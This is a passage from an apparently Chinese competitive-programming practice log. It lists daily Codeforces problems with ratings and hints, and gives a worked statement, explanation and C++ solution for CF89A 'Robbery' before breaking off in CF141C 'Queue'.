$t’(t’\gt t)$ seconds.</td></tr></tbody></table><p>03.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/617/C">CF617C</a></td><td>Iterate over what flower is in the range of the first fountain. Special case: no flowers.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/332/C">CF332C</a></td><td>If the orders are chosen, how should the chairperson choose? Sort the array so that this part comes easy.</td></tr></tbody></table><p>03.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/404/C">CF404C</a></td><td>When a vertex connects with its previous vertex in the shortest path, a tree is formed.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1089/F">CF1089F</a></td><td>Turn $b$ all into $n$ , then each $a$ is not coprime to $n$ and sums up to $n-1$ .</td></tr></tbody></table><p>03.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/638/C">CF638C</a></td><td>Color the edge in the day it is repaired.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/488/B">CF488B</a></td><td>Solve the equation first.</td></tr></tbody></table><p>03.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/718/A">CF718A</a></td><td>We should find the first position after the decimal point which is no smaller than $5$ .</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/291/E">CF291E</a></td><td>Consider the problem in DFS. It’s about checking the number of occurences of string $t$ in $s$ when adding or removing a last character.</td></tr></tbody></table><p>03.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1202/B">CF1202B</a></td><td>There are some repetitive pairs.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1951/D">CF1951D</a></td><td>If $k$ is small enough, it’s always easy.</td></tr></tbody></table><p>03.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1202/B">CF1202B</a></td><td>There are some repetitive pairs.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1951/D">CF1951D</a></td><td>If $k$ is small enough, it’s always easy.</td></tr></tbody></table><p>03.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/380/A">CF380A</a></td><td>It is such a repetitive array, and it can be divided into several parts.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/757/D">CF757D</a></td><td>The largest number can’t get too large.</td></tr></tbody></table><p>03.31</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/255/D">CF255D</a></td><td>Use inclusion-exlusion method to calculate the number of cells switched on.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/847/I">CF847I</a></td><td>Noise can’t get too far.</td></tr></tbody></table><h3 id="04月-1"><a href="#04月-1" class="headerlink" title="04月"></a>04月</h3><p>04.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/691/C">CF691C</a></td><td>You just need to decide the two parts of the expression.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/336/B">CF336B</a></td><td>For different $(i,j)$ -s, How should you get from $(2iR-R, 0)$ to $(2jR-R, 2R)$.</td></tr></tbody></table><p>04.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/766/C">CF766C</a></td><td>Just $3$ DP-s.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1090/K">CF1090K</a></td><td>Focus on the infinite part.</td></tr></tbody></table><p>04.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/405/D">CF405D</a></td><td>Pair the numbers. What if the paired numbers are already chosen?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/911/E">CF911E</a></td><td>How can you check whether a permutation satisfy the conditions?</td></tr></tbody></table><p>04.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1530/D">CF1530D</a></td><td>Find positions to change and numbers they get changed into.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/386/D">CF386D</a></td><td>Classic shortest path problem.</td></tr></tbody></table><p>04.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/715/A">CF715A</a></td><td>Consider what property the number should have before $\sqrt{}$ operation.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/1090/E">CF1090E</a></td><td>It’s always possible to go from $(x,y)$ to $(x’,y’)$ .</td></tr></tbody></table><p>04.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/83/B">CF83B</a></td><td>Which round is it?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1938/C">CF1938C</a></td><td>$p(x+1)\leq p(x)$ means something.</td></tr></tbody></table><p>04.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/727/D">CF727D</a></td><td>Some are fixed. Others can be greedily distributed.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/412/E">CF412E</a></td><td>There is exactly one <code>&#39;@&#39;</code> in each email.</td></tr></tbody></table><p>04.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/442/A">CF442A</a></td><td>Iterate over all possible combinations of hints.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/29/D">CF29D</a></td><td>If you are at $u$ , where should you go?</td></tr></tbody></table><p>04.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/925/B">CF925B</a></td><td>If you decide to use some of the servers, re-distribute them between services.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/413/D">CF413D</a></td><td>What’s remaining for merging?</td></tr></tbody></table><p>04.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/272/D">CF272D</a></td><td>Which points can be swapped in the final sequence?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/212/C">CF212C</a></td><td>If you know the original direction and the current direction of $i$ , you can decide that of $i + 1$ .</td></tr></tbody></table><p>04.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/605/A">CF605A</a></td><td>Consider the number of cars that are not moved.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1089/A">CF1089A</a></td><td>Pre-process the DP.</td></tr></tbody></table><p>04.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/630/M">CF630M</a></td><td>If you rotate the camera $x$ times, how far is it from being vertical?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/258/B">CF258B</a></td><td>Group the numbers.</td></tr></tbody></table><p>04.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/187/B">CF187B</a></td><td>Consider the path in segments and each segment is composed of one car. In each segment, if you go from $u$ to $v$ , you can pre-process the minimum time. So you can iterate over the number of segments.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/353/B">CF353B</a></td><td>Distribute the numbers evenly.</td></tr></tbody></table><p>04.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/187/B">CF187B</a></td><td>Consider the path in segments and each segment is composed of one car. In each segment, if you go from $u$ to $v$ , you can pre-process the minimum time. So you can iterate over the number of segments.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/353/B">CF353B</a></td><td>Distribute the numbers evenly.</td></tr></tbody></table><p>04.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1835/A">CF1835A</a></td><td>Iterate over $a$ . What can be $b$ ?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/676/D">CF676D</a></td><td>Rotating $4$ times means nothing.</td></tr></tbody></table><p>04.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/603/A">CF603A</a></td><td>Classic DP. Or …?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1938/J">CF1938J</a></td><td>You just need to find the $2$ shortest path from $1$ to $n$ .</td></tr></tbody></table><p>04.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/317/A">CF317A</a></td><td>Make both positive. Then what should you do?</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/200/A">CF200A</a></td><td>There are only a few rows that you need to check!</td></tr></tbody></table><p>04.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/87/B">CF87B</a></td><td>Just implement it.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1277/D">CF1277D</a></td><td>There are $4$ types of strings.</td></tr></tbody></table><p>04.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/847/C">CF847C</a></td><td>Just make sure you can make another move.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/490/D">CF490D</a></td><td>Two operations are adjusting the power of $2$ and $3$ in the numbers.</td></tr></tbody></table><p>04.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1092/C">CF1092C</a></td><td>You just need to find the concatenation of the two longest substrings.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/818/C">CF818C</a></td><td>You just need to calculate the number of sofas to the left &#x2F; right &#x2F; upside &#x2F; downside of one position.</td></tr></tbody></table><p>04.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1468/D">CF1468D</a></td><td>Do something bad and run.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/234/H">CF234H</a></td><td>The second step is easy to optimize and you can calculate the total number of moves. How’s it determined? Use the first step to make it fewer.</td></tr></tbody></table><p>04.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/793/B">CF793B</a></td><td>DFS or you can check something different.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/362/D">CF362D</a></td><td>Greedily merge the components.</td></tr></tbody></table><p>04.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/616/C">CF616C</a></td><td>Classic DSU.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/593/C">CF593C</a></td><td>A formula for each circle.</td></tr></tbody></table><p>04.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/845/D">CF845D</a></td><td>It’s about how many rules you disobey. The harder one is the speed limit.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1423/B">CF1423B</a></td><td>If we have a deadline, there are only a few roads that can be built. They represent the possible pairs that can be formed.</td></tr></tbody></table><p>04.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/690/E1">CF690E1</a></td><td>Find the special characteristic.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/367/B">CF367B</a></td><td>If you delete one element and add another one, can you check the condition efficiently?</td></tr></tbody></table><p>04.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/269/B">CF269B</a></td><td>Find the maximum number of plants that don’t need to be moved.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/2073/J">CF2073J</a></td><td>It’s about merging to $2$ remaining elements together.</td></tr></tbody></table><h3 id="05月-1"><a href="#05月-1" class="headerlink" title="05月"></a>05月</h3><p>05.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/617/D">CF617D</a></td><td>What are the different cases?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/433/D">CF433D</a></td><td>What data do you need to find the answer?</td></tr></tbody></table><p>05.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/375/B">CF375B</a></td><td>Iterate over the right bound.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/631/D">CF631D</a></td><td>The middle part should be exactly the same.</td></tr></tbody></table><p>05.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/599/C">CF599C</a></td><td>Don’t use any kind of data structures..</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/679/C">CF679C</a></td><td>Iterate over the position of the square. What should you pre-process?</td></tr></tbody></table><p>05.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/89/A">CF89A</a></td><td>How many diamonds should you move if you take out one of them?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/685/B">CF685B</a></td><td>If $v$ is the son of $u$ with the subtree of the largest size, the centroid of the subtree of $u$ is also an ancestor of the centroid of the subtree of $v$ .</td></tr></tbody></table><h4 id="CF89A-Robbery"><a href="#CF89A-Robbery" class="headerlink" title="CF89A. Robbery"></a>CF89<a href="https://codeforces.com/problemset/problem/89/A">A. Robbery</a></h4><blockquote><p>time limit per test 1 second</p><p>memory limit per test 256 megabytes</p></blockquote><p>It is nighttime and Joe the Elusive got into the country’s main bank’s safe. The safe has <em>n</em> cells positioned in a row, each of them contains some amount of diamonds. Let’s make the problem more comfortable to work with and mark the cells with positive numbers from 1 to <em>n</em> from the left to the right.</p><p>Unfortunately, Joe didn’t switch the last security system off. On the plus side, he knows the way it works.</p><p>Every minute the security system calculates the total amount of diamonds for each two adjacent cells (for the cells between whose numbers difference equals 1). As a result of this check we get an <em>n</em> - 1 sums. If at least one of the sums differs from the corresponding sum received during the previous check, then the security system is triggered.</p><p>Joe can move the diamonds from one cell to another between the security system’s checks. He manages to move them no more than <em>m</em> times between two checks. One of the three following operations is regarded as moving a diamond: moving a diamond from any cell to any other one, moving a diamond from any cell to Joe’s pocket, moving a diamond from Joe’s pocket to any cell. Initially Joe’s pocket is empty, and it can carry an unlimited amount of diamonds. It is considered that before all Joe’s actions the system performs at least one check.</p><p>In the morning the bank employees will come, which is why Joe has to leave the bank before that moment. Joe has only <em>k</em> minutes left before morning, and on each of these <em>k</em> minutes he can perform no more than <em>m</em> operations. All that remains in Joe’s pocket, is considered his loot.</p><p>Calculate the largest amount of diamonds Joe can carry with him. Don’t forget that the security system shouldn’t be triggered (even after Joe leaves the bank) and Joe should leave before morning.</p><p>Input</p><p>The first line contains integers <em>n</em>, <em>m</em> and <em>k</em> (1 ≤ <em>n</em> ≤ 104, 1 ≤ <em>m</em>, <em>k</em> ≤ 109). The next line contains <em>n</em> numbers. The <em>i</em>-th number is equal to the amount of diamonds in the <em>i</em>-th cell — it is an integer from 0 to 105.</p><p>Output</p><p>Print a single number — the maximum number of diamonds Joe can steal.</p><p>Examples</p><p>Input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 3 1</span><br><span class="line">2 3</span><br></pre></td></tr></table></figure><p>Output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><p>Input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3 2 2</span><br><span class="line">4 1 3</span><br></pre></td></tr></table></figure><p>Output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p>Note</p><p>In the second sample Joe can act like this:</p><p>The diamonds’ initial positions are 4 1 3.</p><p>During the first period of time Joe moves a diamond from the 1-th cell to the 2-th one and a diamond from the 3-th cell to his pocket.</p><p>By the end of the first period the diamonds’ positions are 3 2 2. The check finds no difference and the security system doesn’t go off.</p><p>During the second period Joe moves a diamond from the 3-rd cell to the 2-nd one and puts a diamond from the 1-st cell to his pocket.</p><p>By the end of the second period the diamonds’ positions are 2 3 1. The check finds no difference again and the security system doesn’t go off.</p><p>Now Joe leaves with 2 diamonds in his pocket.</p><h5 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h5><p>输入：第一行输入单元格数n、操作次数m、时间k，第二行输入每个单元格的钻石数量</p><p>在k分钟时间内进行m次操作，求其能够带走的钻石数量的最大值。</p><p>输出：其能够带走的钻石数量的最大值</p><h5 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h5><p>分情况讨论：</p><ol><li><strong>当 <code>n</code> 为偶数</strong>：<ul><li>直接输出 <code>0</code>，因为无法完成有效操作，无法覆盖所有必要的位置。</li></ul></li><li><strong>当 <code>n</code> 为奇数</strong>：<ul><li>计算最大可能收益：<ul><li><code>(n / 2 + 1)</code>：表示需要的操作次数（如 <code>n=5</code> 时需要 <code>3</code> 次操作）。</li><li><code>m / (n / 2 + 1)</code>：可执行的最大完整操作次数。</li><li><code>* k</code>：每次操作的时间收益。</li></ul></li><li>最终结果为 <code>val</code> 和计算值的较小者。</li></ul></li></ol><h6 id="AC-Code："><a href="#AC-Code：" class="headerlink" title="AC Code："></a>AC Code：</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> ll = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __cplusplus &gt;= 201703L</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAFE_MODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAFE_MODE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> n, m, k;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;</span><br><span class="line"></span><br><span class="line">ll val = <span class="number">1e9</span>, x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++ i) &#123;</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) val = <span class="built_in">min</span> (val, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span>) cout &lt;&lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="built_in">min</span> (val, <span class="number">1ll</span> * m / (n / <span class="number">2</span> + <span class="number">1</span>) * k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>05.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/794/C">CF794C</a></td><td>A greedy approach. But think carefully.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/653/C">CF653C</a></td><td>Note that the sequence is not nice now.</td></tr></tbody></table><p>05.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/245/C">CF245C</a></td><td>It’s a binary tree. Just operate from the leaves.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/82/C">CF82C</a></td><td>It’s allowed to solve the problem in $\mathcal{O}(n^2)$ .</td></tr></tbody></table><p>05.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/605/B">CF605B</a></td><td>If you have a minimum spanning tree of the graph, how can you add an edge to the graph without changing the MST?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/662/D">CF662D</a></td><td>Take notice of the leading zeros.</td></tr></tbody></table><p>05.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/877/C">CF877C</a></td><td>Use the first few steps to make sure the tank is in some of the positions.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/12/E">CF12E</a></td><td>Find out the rules.</td></tr></tbody></table><p>05.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/689/B">CF689B</a></td><td>Just another simple shortest-path problem.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/425/C">CF425C</a></td><td>You can’t really operate many number of times.</td></tr></tbody></table><p>05.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/768/C">CF768C</a></td><td>Note that the value range is small.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/552/D">CF552D</a></td><td>Calculate all tri-ples and remove those wrong ones.</td></tr></tbody></table><p>05.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/67/B">CF67B</a></td><td>Add numbers from large to small.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/208/C">CF208C</a></td><td>The number of safe roads is not large, so you can consider different cases.</td></tr></tbody></table><p>05.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/294/B">CF294B</a></td><td>If you know the total widths of the vertical books, you can tell the total widths of the horizontal ones.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1970/E2">CF1970E2</a></td><td>It’s an easy DP transition.</td></tr></tbody></table><p>05.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/327/C">CF327C</a></td><td>Iterate over the possible positions of the last digit.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/109/D">CF109D</a></td><td>Consider different cases. You only need one lucky number.</td></tr></tbody></table><p>05.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/780/C">CF780C</a></td><td>When you do a DFS, just fill the uncolored vertex with the smallest number.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/309/B">CF309B</a></td><td>If you know the start of one line, its end is already determined. It is the same for the other lines.</td></tr></tbody></table><p>05.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/932/C">CF932C</a></td><td>Cycles.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1970/E3">CF1970E3</a></td><td>Find the appropriate definition of status such that the number of them is small enough.</td></tr></tbody></table><p>05.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1915/G">CF1915G</a></td><td>Classic shortest path problem.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/232/B">CF232B</a></td><td>Connection between the $i$ -th column and the $i+n$ -th column.</td></tr></tbody></table><p>05.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/141/C">CF141C</a></td><td>Consider an order to construct.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/261/B">CF261B</a></td><td>Consider the guest that breaks the limit.</td></tr></tbody></table><h4 id="CF141C-Queue"><a href="#CF141C-Queue" class="headerlink" title="CF141C. Queue"></a>CF141<a href="https://codeforces.com/problemset/problem/141/C">C. Queue</a></h4><blockquote><p>time limit per test:2 seconds<br>memory limit per test:256 megabytes</p></blockquote><p>In the Main Berland Bank n people stand in a queue at the cashier, everyone knows his&#x2F;her height hi, and the heights of the other people in the queue. Each of them keeps in mind number ai — how many people who are taller than him&#x2F;her and stand in queue in front of him.</p><p>After a while the cashier has a lunch break and the people in the queue seat on the chairs in the waiting room in a random order.</p><p>When the lunch break was over, it turned out that nobody can remember the exact order of the people in the queue, but everyone remembers his number ai.</p><p>Your task is to restore the order in which the people stood in the queue if it is possible. There may be several acceptable orders, but you need to find any of them. Also, you need to print a possible set of numbers hi — the heights of people in the queue, so that the numbers ai are correct.</p><p>Input<br>The first input line contains integer n — the number of people in the queue (1 ≤ n ≤ 3000). Then n lines contain descriptions of the people as “namei ai” (one description on one line), where namei is a non-empty string consisting of lowercase Latin letters whose length does not exceed 10 characters (the i-th person’s name), ai is an integer (0 ≤ ai ≤ n - 1), that represents the number of people who are higher and stand in the queue in front of person i. It is guaranteed that all names are different.</p><p>Output<br>If there’s no acceptable order of the people in the queue, print the single line containing “-1” without the quotes. Otherwise, print in n lines the people as “namei hi”, where hi is the integer from 1 to 109 (inclusive), the possible height of a man whose name is namei. Print the people in the order in which they stand in the queue, starting from the head of the queue and moving to its tail. Numbers hi are not necessarily unique.</p><p>Examples<br>Input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">a 0</span><br><span class="line">b 2</span><br><span class="line">c 0</span><br><span class="line">d 0</span><br></pre></td></tr></table></figure><p>Output</p><figure class="highlight 